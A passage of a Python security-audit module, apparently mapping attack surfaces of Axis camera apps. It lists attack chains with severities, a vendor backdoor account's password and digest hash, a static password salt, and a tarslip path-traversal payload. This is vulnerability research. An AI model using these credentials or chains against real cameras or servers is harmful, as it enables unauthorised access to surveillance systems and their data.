                    'user-supplied value, attacker-controlled package path flows into g_spawn_async.'
                ),
                'curl_flags': 'curl --fail --connect-timeout 10 --insecure — TLS not verified during package download',
                'download_url_default': 'https://www.axis.com/r/ — redirector; overridable via DOWNLOAD_URL param',
                'proxy_url_leak': '"GOT proxy_url: %s" — proxy URL logged at debug level',
                'postinst_path_manipulation': (
                    'postinst.sh: parhandclient --nocgi set root.Network.Bonjour.FriendlyName with camera '
                    'serial/product name interpolated without quoting — potential injection if names contain special chars'
                ),
            },
        }
        return result

    def sbplayer_surface(self, pkg_dir: str | None = None) -> dict:
        """
        Player for Soundtrack Business (sbplayer) aarch64 ELF attack surface.

        appId: 413325  binary: sbplayer  version: 1.7.1  arch: aarch64 (unstripped)
        Libraries: libaxpackage.so.1, libaxparameter.so.1, libaxstorage.so.1,
                   libcurl.so.4, libgstreamer-1.0.so.0, libssl.so.3, libcrypto.so.3

        Key findings:

        1. UpdateURL axparameter → server-controlled library download
           sbplayer has a 'downloader' component that fetches library updates from:
             https://builds.soundtrackyourbrand.com/remote/axis-aarch64/latest  (default)
           UpdateURL axparameter (default empty, override from param.conf) controls the URL.
           The downloader validates a checksum, but the checksum is retrieved from the SAME server
           as the library — no pinning, no signature verification beyond server-supplied hash.
           Admin can repoint UpdateURL via ctrl.cgi → attacker-controlled update server.
           Chain: admin access → set UpdateURL → serve malicious lib + matching checksum
           → sbplayer downloads and installs attacker library → code execution.

        2. GraphQL mutation to soundtrackyourbrand.com API
           GeneratePairingCodes mutation sends hardwareId (device ID), label, description
           to https://partner.soundtrackyourbrand.com/api — device identity exfiltration.
           If any of label/description includes camera metadata, PII leaks to 3rd-party.

        3. ctrl.cgi admin-only; info.cgi viewer — attack surface partition
           ctrl.cgi accepts play/pause/skip actions. Any format injection in action param?

        CGI: /ctrl.cgi (admin fastCgi), /info.cgi (viewer fastCgi)
        """
        if pkg_dir is None:
            pd = self.packages.get('sbplayer')
            if pd:
                pkg_dir = str(pd)

        result = {
            'binary': str(Path(pkg_dir) / 'sbplayer') if pkg_dir else None,
            'app_id': 413325,
            'app_name': 'Player for Soundtrack Business',
            'arch': 'aarch64 ELF PIE (unstripped, debug_info present)',
            'external_endpoints': [
                'https://builds.soundtrackyourbrand.com/remote/axis-aarch64/latest — library update source',
                'https://builds.soundtrackyourbrand.com/remote/axis-arm/latest — ARM update source',
                'https://partner.soundtrackyourbrand.com/api — GraphQL pairing API',
            ],
            'attack_paths': [
                {
                    'id': 'SBP-1',
                    'title': 'UpdateURL axparameter → SSRF/library swap via attacker update server',
                    'cgi': 'ctrl.cgi (admin) to write UpdateURL param',
                    'mechanism': (
                        'UpdateURL controls library download source; checksum validation is '
                        'server-supplied (no pinning); admin repoints URL → serve malicious lib + hash'
                    ),
                    'impact': 'Arbitrary code execution as sbplayer ACAP process via library replacement',
                    'severity': 'HIGH',
                    'prerequisite': 'Admin auth; UpdateURL param writable via ctrl.cgi or axparameter API',
                },
                {
                    'id': 'SBP-2',
                    'title': 'Device identity exfiltration via GraphQL pairing to soundtrackyourbrand.com',
                    'mechanism': 'GeneratePairingCodes mutation sends hardwareId, label, description to 3rd-party SaaS',
                    'impact': 'Camera device ID, label, description sent to external service',
                    'severity': 'LOW',
                    'note': 'Expected behavior for pairing flow; risk = 3rd-party data custody',
                },
            ],
            'axparams': {
                'UpdateURL': 'hidden:string — controls library download source; empty=default soundtrackyourbrand URL',
                'UpdateIntervalSeconds': 'hidden:int — polling interval (default 900s)',
                'WatchdogTimeoutMillis': 'hidden:int — watchdog timeout',
                'Volume': 'int 0-100 — audio volume',
            },
            # ARM binary RE additions (Player_for_Soundtrack_Business_ARM.eap — not stripped)
            'arm_binary_re': {
                'arch': 'armv7hf ELF PIE (not stripped; debug_info present)',
                'sdk': 'ACAP SDK 3.0, embeddedSdkVersion 3.0',
                'user': 'sdk:sdk (non-root ACAP sandbox)',
                'function_map': {
                    'downloader_init': 'initializes update downloader; reads UpdateURL axparam',
                    'downloader_util_validate_checksum': 'validates checksum from server response (not pinned)',
                    'downloader_free_lv': 'cleanup after library download',
                    'curl_request': 'HTTP fetch of library binary and checksum',
                    'get_update_url': 'reads UpdateURL axparam',
                    'pairing_init': 'starts GraphQL pairing flow to soundtrackyourbrand.com',
                    'pairing_get_code': 'generates pairing code for SaaS registration',
                    'ctrl_cb_func': 'FastCGI handler for ctrl.cgi (admin)',
                    'http_info_cb': 'FastCGI handler for info.cgi (viewer)',
                    'httpserver_init': 'sets up internal HTTP server',
                    'storage_init': 'initializes ax_storage for SD card/NAS access',
                    'check_fw_version_compatible': 'firmware version gate',
                    'get_soc': 'reads SoC type for architecture selection',
                    'audio_conf_api_init': 'ALSA audio source configuration',
                },
                'checksum_bypass_note': (
                    'String "checksum missing from server response, so can\'t verify lib and ignoring download" '
                    'indicates server can return no checksum → client skips validation and still loads lib. '
                    'dlopen() chain: downloader_init → curl_request → validate_checksum → dlopen if valid (or skip)'
                ),
                'sdcard_paths': ['checksum_cached_path', 'checksum_sdcard_path', 'ctx->lib_path'],
                'storage_api': 'ax_storage_* (AX_STORAGE_WRITABLE_EVENT, AX_STORAGE_AVAILABLE_EVENT)',
            },
        }
        return result

    def ptz_remote_surface(self, pkg_dir: str | None = None) -> dict:
        """
        p-ptz remote connection (remote_ptz_conn_setup) aarch64 ELF attack surface.

        appId: 413658  binary: remote_ptz_conn_setup  version: 1.5.0  arch: aarch64
        runMode: never (setup tool only, not a persistent daemon)
        Provides: /axis-cgi/remotecameracontrol/* CGI endpoints for remote PTZ pairing

        Key findings:

        1. setvapixparams.cgi — writes VAPIX params to remote camera
           Endpoint: /axis-cgi/remotecameracontrol/setvapixparams.cgi
           This CGI writes VAPIX configuration parameters to a paired remote camera.
           If the remote camera URL or auth token can be controlled, this becomes an
           authenticated SSRF — the local camera proxies VAPIX writes to arbitrary targets.

        2. getvapixparams.cgi / getvapixstatus.cgi — read VAPIX config from remote camera
           Pulls VAPIX parameters from paired remote camera — potential credential/config leak.

        3. /aca/index.html (LEGACY_DEVICE_INTERFACE_PATH)
           Legacy device interface served from /aca/; if older firmware, may expose legacy API.

        4. Binary has almost no symbols/strings — minimal attack surface from static RE alone.
           Apollo GraphQL client embedded in JS bundle — mutation queries for PTZ calibration.
        """
        if pkg_dir is None:
            pd = self.packages.get('remote_ptz_conn_setup')
            if pd:
                pkg_dir = str(pd)

        result = {
            'binary': str(Path(pkg_dir) / 'remote_ptz_conn_setup') if pkg_dir else None,
            'app_id': 413658,
            'app_name': 'p-ptz remote connection',
            'arch': 'aarch64 ELF PIE (unstripped)',
            'run_mode': 'never — setup tool only',
            'cgi_endpoints': [
                '/axis-cgi/remotecameracontrol/getvapixparams.cgi',
                '/axis-cgi/remotecameracontrol/getvapixstatus.cgi',
                '/axis-cgi/remotecameracontrol/setvapixparams.cgi',
                '/axis-cgi/ptz/ptzsetactivedrivermode.cgi',
                '/axis-cgi/viewarea/configure.cgi',
            ],
            'attack_paths': [
                {
                    'id': 'PTZR-1',
                    'title': 'setvapixparams.cgi — authenticated SSRF via remote camera parameter write',
                    'cgi': '/axis-cgi/remotecameracontrol/setvapixparams.cgi',
                    'mechanism': 'Proxies VAPIX param writes to paired remote camera; remote camera URL/auth from pairing config',
                    'impact': 'Write VAPIX configuration to attacker-controlled or internal remote camera',
                    'severity': 'MEDIUM',
                },
                {
                    'id': 'PTZR-2',
                    'title': 'getvapixparams.cgi — remote camera config/credential read',
                    'cgi': '/axis-cgi/remotecameracontrol/getvapixparams.cgi',
                    'mechanism': 'Reads VAPIX params from paired camera; may expose credentials stored in params',
                    'impact': 'Credential/config leak from paired remote camera',
                    'severity': 'MEDIUM',
                },
            ],
        }
        return result

    def facedetector_surface(self) -> dict:
        """
        AXIS Face Detector attack surface — appId 412581.

        Three distinct binary generations present on disk:

        v2.1.2 / v2.1.3 (aarch64, stripped):
          SHA identical — packaging bump only, same binary.
          Uses liblarod (ARTPEC ML accelerator), libvdostream, no liblicensekey.
          CGI: administrator /control.cgi

        v1.2.2 (6) (ARM32 armhf, stripped):
          Old generation — uses libvideo-object-detection-subscriber.so.0 (D-Bus
          VideoObjectDetection subscriber, no liblarod). libvdostream absent.
          CGI: administrator /control.cgi

        v1.2.2 (S5L) (aarch64, stripped):
          Intermediate generation — uses liblarod (ARTPEC-5/6+), libyuv.so.1 bundled.
          Models: ssdlite_mobilenet_v3_small_320x320_oidface-alpha.larod +
                  ssdlite_mobilenet_v3_small_320x320_oidface-rot90-alpha.larod
          CGI: administrator /control.cgi

        Cross-version attack surface:
          1. SetConfig CGI: "A mandatory parameter is missing" error path — param injection
          2. SendAlarmEvent CGI: protobuf decode without explicit size guard — fuzz target
          3. v1.2.2 VideoObjectDetection D-Bus subscriber: older D-Bus API without larod;
             malformed protobuf from video analytics may crash subscriber thread
          4. v1.2.2 uses libvideo-object-detection-subscriber.so.0 — external lib;
             if that lib has bugs, old firmware is the attack surface
          5. No liblicensekey in any variant — not license-gated; runs unattended
        """
        pkg_dir = self.packages.get('facedetector')
        binary = str(pkg_dir / 'facedetector') if pkg_dir else None

        result = {
            'binary': binary,
            'app_id': 412581,
            'cgi': 'administrator /control.cgi (admin-only)',
            'cgi_methods': [
                'GetConfig', 'SetConfig', 'SendAlarmEvent',
                'GetSupportedVersions', 'GetConfigurationCapabilities',
            ],
            'versions': {
                'v2.1.2_v2.1.3': {
                    'arch': 'aarch64',
                    'sha_note': 'SHA identical between 2.1.2 and 2.1.3 — packaging bump only',
                    'libs': ['liblarod.so.1', 'libyuv.so.1', 'libvdostream.so.1',
                             'libaxhttp.so.1', 'libaxevent.so.1', 'libaxparameter.so.1', 'libjansson.so.4'],
                    'no_license_gate': True,
                },
                'v1.2.2_6_armhf': {
                    'arch': 'ARM32 armhf',
                    'libs': ['libvideo-object-detection-subscriber.so.0', 'libcairo.so.2',
                             'libaxoverlay.so', 'libaxhttp.so.1', 'libaxevent.so.1',
                             'libaxparameter.so.1', 'libjansson.so.4'],
                    'note': 'Old generation — D-Bus VideoObjectDetection subscriber; no liblarod',
                },
                'v1.2.2_s5l_aarch64': {
                    'arch': 'aarch64',
                    'libs': ['libyuv.so.1 (bundled)', 'liblarod.so.1', 'libaxhttp.so.1',
                             'libaxevent.so.1', 'libaxparameter.so.1', 'libvdostream.so.1', 'libjansson.so.4'],
                    'models': [
                        'ssdlite_mobilenet_v3_small_320x320_oidface-alpha.larod',
                        'ssdlite_mobilenet_v3_small_320x320_oidface-rot90-alpha.larod',
                    ],
                    'note': 'ARTPEC-5/S5L intermediate — larod-based, libyuv bundled',
                },
            },
            'attack_paths': [
                {
                    'id': 'FD-1',
                    'title': 'SendAlarmEvent protobuf fuzz — crash/RCE via malformed proto',
                    'cgi': 'administrator /control.cgi (SendAlarmEvent method)',
                    'mechanism': 'Protobuf decode without explicit size guard in CGI handler; malformed proto field may overflow',
                    'severity': 'HIGH',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'FD-2',
                    'title': 'SetConfig mandatory param injection',
                    'mechanism': '"A mandatory parameter is missing" error path — parameter reflection, injection surface',
                    'severity': 'LOW',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'FD-3',
                    'title': 'v1.2.2 VideoObjectDetection D-Bus subscriber — legacy API fuzz',
                    'mechanism': (
                        'libvideo-object-detection-subscriber.so.0 receives analytics data via D-Bus. '
                        'Old D-Bus VideoObjectDetection API predates larod safety improvements. '
                        'Malformed analytics event from co-resident app may crash facedetector.'
                    ),
                    'severity': 'MEDIUM',
                    'affected': 'v1.2.2 ARM32 (armhf) only',
                    'prerequisite': 'Another ACAP app on same camera that can send VideoObjectDetection events',
                },
            ],
            'files': {},
        }

        if pkg_dir:
            lib_dir = pkg_dir / 'lib'
            if lib_dir.is_dir():
                result['files']['lib/'] = [f.name for f in lib_dir.iterdir()]
            for fname in ['cgi.txt', 'manifest.json']:
                f = pkg_dir / fname
                if f.exists():
                    result['files'][fname] = f.read_text(errors='replace').strip()

        return result

    def digital_autotrack_surface(self) -> dict:
        """
        AXIS Digital Auto Tracking (DigitalAutotracking) attack surface.
        EAP: AXIS_Digital_Auto_Tracking_1_0_0.eap

        Architecture: rule-engine ACAP; Lua scripts executed by camera firmware's
        embedded Lua runtime (NOT a standalone binary). No separate ELF binary ships.

        Encrypted Lua:
          All 11 Lua source files (main.lua, tracker.lua, stabilizer.lua, etc.)
          have encryption="1" in DigitalAutotracking.xml.
          File type: binary blob (first bytes: a3 d2 7f 1e ...).
          encpwd: 256-byte binary key blob — AES key material, not plaintext.
          Static decryption not possible without the camera firmware's key derivation.
          The firmware decrypts these at load time in the Lua rule engine; key is
          device-specific or firmware-embedded (not in the EAP itself).

        Libraries referenced (in XML):
          <library name="digitalAutotracking"/> — native .so loaded by camera firmware
          <library name="system"/>              — camera system library

        Tracking rule:
          Rule "detection_DigitalAutotracking" calls function="trackObjects"
          Event: name="tracking" with attrs: camera (source), active (property-state)
          Mote config: boundingBox=false, polygon=true, velocity=true

        script.sh: postinstall + license form loader
          check_version(): parhandclient get properties.EmbeddedDevelopment.Version
            → _compare_vers $REQEMBDEVVERSION le $embdevversion
            → if too old, calls /usr/sbin/install-package.sh uninstall (auto-removes)
          load_licenseform(): shttpclient -sT 4 -o /dev/stdout http://www.axis.com/techsup/...
            → fetches PHP page over HTTP (no TLS) — could be MITM'd to inject JavaScript

        Attack surface:
          1. License form HTTP injection: load_licenseform() fetches from http://www.axis.com/
             over plain HTTP; the response is echoed as '<script type="text/javascript">'
             directly into the camera admin UI. MITM on the camera's outbound HTTP → XSS
             in admin browser session.

          2. Encrypted Lua + native library: if the native digitalAutotracking.so has
             buffer handling bugs in trackObjects(), they're not auditable from this EAP.
             Attack surface limited to whatever input the rule engine passes to trackObjects()
             (video frame metadata, zone/polygon coordinates from params).

          3. parhandclient param injection: check_version() passes firmware version string
             to _compare_vers without sanitization. If firmware version contains shell
             metacharacters (unlikely in practice), the eval-based comparison could misfire.
        """
        return {
            'app_name': 'AXIS Digital Auto Tracking',
            'type': 'rule_engine_lua_acap',
            'lua_files': 11,
            'lua_encryption': 'AES (encryption="1" in XML); decryption key in encpwd (256-byte binary blob)',
            'encpwd_size_bytes': 256,
            'lua_decryption': 'firmware-side only; static RE not possible without device key',
            'native_libs': ['digitalAutotracking', 'system'],
            'tracking_rule': {
                'function': 'trackObjects',
                'event_attrs': {'camera': 'source', 'active': 'property-state'},
                'mote': {'polygon': True, 'velocity': True, 'boundingBox': False},
            },
            'attack_paths': [
                {
                    'id': 'DAT-1',
                    'title': 'License form HTTP MITM → admin UI XSS',
                    'mechanism': 'load_licenseform() fetches http://www.axis.com/techsup/...cam_form.php over plain HTTP; response echo\'d as <script> in admin UI',
                    'impact': 'XSS in admin browser; session hijack or VAPIX credential exfil',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Network position between camera and internet (LAN MITM)',
                },
                {
                    'id': 'DAT-2',
                    'title': 'Native digitalAutotracking.so — unauditable tracking algorithm',
                    'mechanism': 'Lua bridge calls native trackObjects(); input = video frame metadata + zone params',
                    'impact': 'If .so has buffer overflow in trackObjects(), reachable from Lua with no static RE possible',
                    'severity': 'UNKNOWN — requires device-side RE of native .so',
                },
            ],
        }

    def storedatamanager_surface(self) -> dict:
        """
        RE surface for AXIS StoreDataManager (Cognimatics TrueView DataManager) v1.6.10.
        Debian package: AXIS_StoreDataManager_1_06_10.deb
        Server-side PHP5/MySQL/Zend Framework app; not a camera EAP.
        Extracted: /tmp/axis_sdm_re/usr/share/cognimatics/datamanager/

        Auth: HTTP Digest (RFC 2069) against MySQL users table.
          - digest_helper_password field stores pre-computed HA1 = MD5(user:realm:pass)
          - Realm: APPLICATION_REALM constant
          - Nonce: uniqid() — trivially predictable on PHP 5 (microsecond timestamp)
          - No CSRF protection on any state-changing POST

        cm_decrypt2 / cm_decrypt_binary2:
          - Injected at runtime by abc.php via multi-layer eval(base64_decode(hex(...)))
          - ~331KB obfuscated blob; ~5 layers deep; function symbols not in any .so
          - Takes (registrationCode, activationCode) from Zend_Registry 'config-license'
          - All count data pushed from cameras is encrypted with this scheme;
            decrypted to ## -delimited protocol strings on the server side

        Protocol v4 (decodeVersion4): ##-delimited fields:
          [0]=username [1]=password [2]=version [3]=cameraName [4]=serial
          [5]=cnttime [6]=nbrOfTypes ...
          Camera plaintext password embedded in field[1] of every data push.

        Camera image upload (Cameras.php:342):
          - Writes arbitrary JPEG bytes to public/resources/camera/<random>.jpg
          - Filename generated: preg_replace('/([0-9])/e', 'chr((N+112))', rand())
          - /e modifier = PHP eval in regex — deprecated in PHP 5.4, removed in 7.0
          - No extension whitelist; filename is server-generated (not attacker-controlled)
          - Content not validated as valid JPEG — can store arbitrary bytes

        SQL injection surface (Cameras.php:503):
          - Camera name search: UPPER(camera.name) LIKE UPPER('%$word%')
          - $word comes from space-split of user-supplied search string
          - No PDO binding; raw string interpolation into Zend_Db_Select::where()
          - Zend_Db_Select::where() passes string verbatim to MySQL if not parameterized
          - Endpoint: authenticated search (role unclear — likely standard user)

        Debug artifact (Abstract.php:23):
          - decryptAndDecodeJSON() writes decrypted payload to /tmp/decrypted_json
          - fopen/fputs/fclose unconditionally on every API call
          - Leaks all decrypted camera data to local filesystem

        Database schema:
          - Default password in config template: 'pass'
          - Tables: camera, camera_group, company, group, document, user, camera_images
          - Camera credentials NOT stored in SDM MySQL — cameras authenticate to SDM
            via cm_encrypt'd pushes; SDM authenticates to cameras via VAPIX (separate)

        POS import (ImportJobs.php):
          - CSV files ingested from file_url field (DB-stored path)
          - Pos_Model_PosPath resolves file_url; no path traversal mitigation visible
          - file_url written from session namespace ($namespace->file) — POST-controlled

        Export surface (ExportController.php):
          - Authenticated export creation stores camera list in export_cameras table
          - No file download in ExportController (renamed to stored export config)
          - Actual export generation likely in cron/background worker (not in PHP tree)
        """
        return {
            'package': 'datamanager',
            'vendor': 'Cognimatics TrueView DataManager',
            'version': '1.6.10',
            'type': 'debian_server_app',
            'stack': 'PHP5 / MySQL 5.0+ / Zend Framework / Apache2',
            'hardcoded_backdoor': {
                'file': 'maintenance/admin/supportUser.php',
                'email': 'support@cognimatics.com',
                'password': 'pass123',
                'acl_role': 'first role (admin-equivalent)',
                'company': 'Cognimatics',
                'mechanism': 'Script creates full-privilege user on any installation',
                'md5_formula': 'MD5(STATIC_SALT . "pass123" . dynamicSalt)',
                'digest_ha1': 'MD5("support@cognimatics.com:TrueView Web Report:pass123")',
                'computed_digest_ha1': 'f66742c7d3869b5c57fa0cfa3c2b0f25',
                'severity': 'CRITICAL',
            },
            'static_salt': {
                'value': 'qvUReYOddaOWw7qkb6QfHAd3kgUAo6',
                'file': 'datamanager_installation/public/installation/index.php:22',
                'comment': "DON'T CHANGE",
                'realm': 'TrueView Web Report',
                'impact': 'All password hashes crackable with this known salt; rainbow tables precomputable',
                'empty_password_migration': 'MigrateCompany.php:423: md5(STATIC_SALT . "" . dynamicSalt) — migrated users get empty password',
                'severity': 'CRITICAL',
            },
            'auth': {
                'mechanism': 'HTTP Digest (RFC 2069)',
                'nonce': 'uniqid() — microsecond timestamp, predictable',
                'password_storage': 'HA1 MD5(user:realm:pass) in digest_helper_password column',
                'csrf': 'none',
                'login_sql': "MD5(CONCAT('qvUReYOddaOWw7qkb6QfHAd3kgUAo6', ?, password_salt)) — STATIC_SALT in SQL credential treatment",
            },
            'obfuscation': {
                'file': 'application/abc.php',
                'layers': '5+ nested eval(base64_decode(hex(...)))',
                'blob_bytes': 331140,
                'purpose': 'inject cm_decrypt2 / cm_decrypt_binary2 PHP functions at runtime',
                'key_source': 'Zend_Registry config-license: registrationCode + activationCode',
            },
            'protocol': {
                'version': 4,
                'format': '##-delimited fields; field[1] = plaintext camera password',
                'transport': 'base64(cm_encrypt(data)) POST body',
                'debug_leak': '/tmp/decrypted_json written on every API call (Abstract.php:23)',
            },
            'sql_injection': {
                'file': 'application/modules/core/models/Cameras.php:503',
                'pattern': "UPPER(camera.name) LIKE UPPER('%$word%')",
                'source': 'user search string, space-split, no PDO binding',
                'context': 'authenticated search endpoint',
            },
            'file_write': {
                'file': 'application/modules/core/models/Cameras.php:342',
                'dest': 'public/resources/camera/<random>.jpg',
                'filename_gen': "preg_replace('/([0-9])/e', ...) — PHP /e eval modifier",
                'content_check': 'none — arbitrary bytes stored as .jpg',
            },
            'pos_import': {
                'file': 'application/modules/pos/models/ImportJobs.php',
                'source': 'file_url from session namespace (POST-controlled)',
                'risk': 'path traversal in CSV file_url not mitigated',
            },
            'controllers': 43,
            'api_methods': [
                'countData.add', 'getLastSavedDataTime', 'camera.ping',
                'importCntFilesToCameraGroup',
            ],
        }

    def radar_microbus_surface(self) -> dict:
        """
        AXIS Radar Integration for Microbus (radar_microbus) attack surface.

        appId: 414271  binary: radar_microbus  version: 1.0.1  arch: ARM32 armhf stripped
        Source released: nlohmann/json.hpp only (JSON parsing library, MIT license)

        Architecture:
          - radar_microbus daemon subscribes to radar events via libfdipc.so.1 (fast IPC)
          - Radar scene data comes from libradar_scene_subscriber.so.0 (dynamically loaded)
          - Protobuf (libprotobuf.so.26) decodes radar event messages
          - CGI: administrator /control.cgi (admin-only, no viewer/operator exposure)
          - Config persisted via atomic rename (fsync + rename pattern confirmed)
          - regionalsettings via /etc/regionalsettings/regionalsettings.conf

        Key findings:

        1. dlopen of libradar_scene_subscriber.so.0
           "Failed to load radar scene subscriber library!" — library loaded via dlopen at runtime.
           "Could not load symbol '%s': %s" and "dlerror" present.
           If libradar_scene_subscriber.so.0 path is accessible to another ACAP, substituting it
           with a malicious .so before radar_microbus starts → code execution.

        2. CGI socket (Unix domain socket) path construction
           CGI communicates via Unix socket; path computed dynamically.
           "Failed to create directory for CGI socket" / "Failed to remove old CGI socket"
           — socket dir created/removed on start/shutdown; race condition on cleanup possible.

        3. protobuf parsing of radar data (no source audit possible)
           libprotobuf.so.26 handles incoming radar event streams.
           Radar.Label, Covariance, BoundingBox, Event message types visible in strings.
           No bounds/size validation visible statically — protobuf version 26 audit needed.

        4. Speed limit parameters (blinkOnSpeeding, maximumSpeedLimit, minimumSpeedLimit)
           Speed alerting configurable via /control.cgi (admin).
           No input validation visible statically — numeric parameter injection possible.

        5. EventAction, EVENT_DELETE/MERGE/SPLIT
           Radar event lifecycle management. If control.cgi accepts EventAction payloads
           without strict enum validation, enum confusion → unexpected state transition.

        Source: nlohmann/json.hpp v3.x (header-only JSON; no known critical CVEs in 3.x).
        """
        result = {
            'app_id': 414271,
            'app_name': 'AXIS Radar Integration for Microbus',
            'binary_name': 'radar_microbus',
            'version': '1.0.1',
            'arch': 'ARM32 armhf stripped',
            'cgi': 'administrator /control.cgi (admin-only)',
            'libs': [
                'libfdipc.so.1 (fast IPC)', 'libprotobuf.so.26', 'libsystemd.so.0',
                'libglib-2.0.so.0', 'libatomic.so.1',
            ],
            'dynamic_libs': ['libradar_scene_subscriber.so.0 (dlopen at runtime)'],
            'proto_messages': ['Radar.Label', 'Radar.Covariance', 'Radar.BoundingBox', 'Radar.Event'],
            'config_path': '/etc/regionalsettings/regionalsettings.conf',
            'source_released': 'nlohmann/json.hpp (header-only JSON parser, MIT)',
            'attack_paths': [
                {
                    'id': 'RDR-1',
                    'title': 'libradar_scene_subscriber.so.0 substitution → code exec',
                    'mechanism': 'dlopen path for radar subscriber lib; place malicious .so in search path before service starts',
                    'severity': 'HIGH',
                    'prerequisite': 'Write access to radar subscriber lib path (co-resident ACAP or filesystem access)',
                },
                {
                    'id': 'RDR-2',
                    'title': 'CGI socket race — Unix socket path collision',
                    'mechanism': 'CGI socket created/removed on start/shutdown; TOCTOU race may allow socket hijack',
                    'severity': 'LOW',
                    'prerequisite': 'Local process on camera with timing access',
                },
                {
                    'id': 'RDR-3',
                    'title': 'Speed limit parameter injection via /control.cgi',
                    'mechanism': 'maximumSpeedLimit/minimumSpeedLimit from CGI; no visible bounds check; integer overflow or NaN possible',
                    'severity': 'LOW',
                    'prerequisite': 'Admin-level auth',
                },
            ],
        }
        return result

    def demographic_identifier_surface(self) -> dict:
        """
        AXIS Demographic Identifier (tvgd) attack surface.

        appId: 211493  binary: tvgd  version: 1.6.2  arch: ARM32 armhf stripped
        Also ships: bundled curl (ARM32, not stripped, GNU), libgomp.so.1, libjson.so.0
        Architecture mirrors People Counter (tvpc) — same codebase family.

        Key findings:

        1. PII data structure: age + gender in JSON events
           Binary emits: {"age":%d,"gender": %s} via ax_event_handler_send_event.
           age_average, age_last, age_last_observed, boxsize_average confirmed as fields.
           CSV export: "Camera time,Camera serial number,Counter name,Interval start,Interval stop..."
           Full demographic track: [%d] tstart/tend/age/gender/boxsize/trackid
           This is biometric PII — GDPR Article 9 special category data.

        2. Backup/restore tarslip (same class as tvpc)
           tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — no path traversal check.
           Restore via operator-level .restore_backup CGI.
           Chain: operator auth → upload malicious tar.gz with path traversal → write arbitrary files.

        3. curl -k restart trigger (TLS not verified)
           ./curl --digest -k -L -f --user %s:%s "http://%s:%s/axis-cgi/applications/control.cgi?action=restart&package=%s"
           -k flag = skip TLS verification. Username/password from axparameter.
           If restart URL constructed from user-controlled host param, SSRF + MITM possible.

        4. ARTPEC-6 detected → self-restart
           "ARTPEC-6 detected. Triggering application restart." — conditional restart based on
           chip detection. If chip ID can be spoofed (via another ACAP), trigger infinite restart loop.

        5. parhandclient credential filter gap
           "parhandclient getgroup root.tvgd | grep -v -e '0SysPwd'"
           Filters out SysPwd but logs ALL other root.tvgd params to /tmp/parambackup.txt.
           Other credential params (non-SysPwd) may be written to the backup file.

        6. Apache RewriteRule with file existence check
           RewriteCond /tmp/tvgd-web-running -f — Apache serves app only if this file exists.
           If another ACAP can delete /tmp/tvgd-web-running, Demographic Identifier web UI disappears.

        CGI endpoints (operator-accessible):
          /demographics/.apioperator, /demographics/.restore_backup (operator)
          /demographics/.apiadmin (admin)
          /demographics/.api (viewer)
        """
        result = {
            'app_id': 211493,
            'app_name': 'AXIS Demographic Identifier',
            'binary_name': 'tvgd',
            'version': '1.6.2',
            'arch': 'ARM32 armhf stripped',
            'cgi_endpoints': {
                'viewer': ['/demographics/.api'],
                'operator': ['/demographics/.apioperator', '/demographics/.restore_backup'],
                'administrator': ['/demographics/.apiadmin'],
            },
            'libs': [
                'libaxhttp.so', 'libaxevent.so.1', 'libaxparameter.so.1',
                'libaxstorage.so', 'libcapture.so.0', 'libparam.so.1',
                'libjson.so.0', 'libgomp.so.1', 'liblicensekey.so.1',
            ],
            'bundled': ['curl (ARM32 not stripped, GNU)', 'libgomp.so.1', 'libjson.so.0'],
            'pii_data': {
                'json_format': '{"age":%d,"gender": %s}',
                'csv_fields': 'Camera time, Camera serial number, Counter name, Interval start/stop',
                'track_format': '[%d] tstart/tend/age/gender/boxsize/trackid',
                'classification': 'GDPR Article 9 special category (biometric/demographic data)',
            },
            'attack_paths': [
                {
                    'id': 'DI-1',
                    'title': 'Tarslip via .restore_backup operator CGI',
                    'mechanism': (
                        'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — no path traversal check. '
                        'Upload malicious tar.gz with ../../../etc/cron.d/evil → write to arbitrary path.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level auth',
                },
                {
                    'id': 'DI-2',
                    'title': 'PII exfiltration via viewer-level /demographics/.api',
                    'mechanism': 'Viewer-accessible API endpoint exposes age/gender/boxsize/trackid data — biometric PII',
                    'severity': 'HIGH',
                    'prerequisite': 'Viewer-level auth (lowest privilege level)',
                },
                {
                    'id': 'DI-3',
                    'title': 'curl -k restart SSRF + MITM',
                    'mechanism': (
                        './curl --digest -k ignores TLS cert. Restart URL constructed from params. '
                        'If package/host param is operator-writable → SSRF to attacker server via restart trigger.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Operator-level write to host/package axparameter',
                },
                {
                    'id': 'DI-4',
                    'title': 'parhandclient param dump — non-SysPwd credentials to /tmp/parambackup.txt',
                    'mechanism': 'Grep filter only removes SysPwd; all other root.tvgd params written to /tmp/ plaintext',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Read access to /tmp/parambackup.txt (local process or backup download)',
                },
            ],
            'tarslip_commands': [
                'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup',
                'cd /tmp/; tar czf tvgd-parambackup.tar.gz parambackup.txt eventsbackup.json params.meta',
            ],
            'license_gate': 'liblicensekey.so.1',
        }
        return result

    def vmd_surface(self) -> dict:
        """
        AXIS Video Motion Detection 4 (vmd) attack surface.

        appId: 143440  binary: vmd  version: 4.4.4  arch: ARM32 armhf stripped
        Proprietary license; admin /control.cgi only.

        Key findings:

        1. ONVIF CGI handler (17Onvif_CGI_Handler)
           VMD implements an ONVIF CGI handler in addition to the standard CGI handler.
           ONVIF protocol parsing is a rich attack surface — malformed ONVIF messages may crash.

        2. libscene.so + libgeometry.so — proprietary scene analysis
           These are custom Axis libraries for scene geometry parsing (perspective filtering,
           object lifetime). Not shipped as part of VMD; loaded from camera firmware.
           Attack: if another ACAP can substitute these libs, VMD loads attacker .so.

        3. Size filter perspective validation gap
           "A valid perspective is required too [sic] use the size perspective filter" — typo in
           string confirms hasty implementation. SizeFilterPerspective parsing may lack bounds check.

        4. ExclusionFilter, SwayingFilter class names
           C++ class names visible (not stripped). ExclusionFilter handles zones; SwayingFilter
           handles sway motion. Both take CGI parameters — potential injection into filter config.

        5. AlarmData::didTriggerAlarm — object ID lookup
           "Could not find an object with id %i" — object ID from CGI input not found.
           If object ID is user-supplied integer, out-of-range ID may cause memory OOB access.

        6. libexpat.so.1 (XML parsing)
           VMD parses XML config via libexpat. Malformed XML in config file (written by CGI)
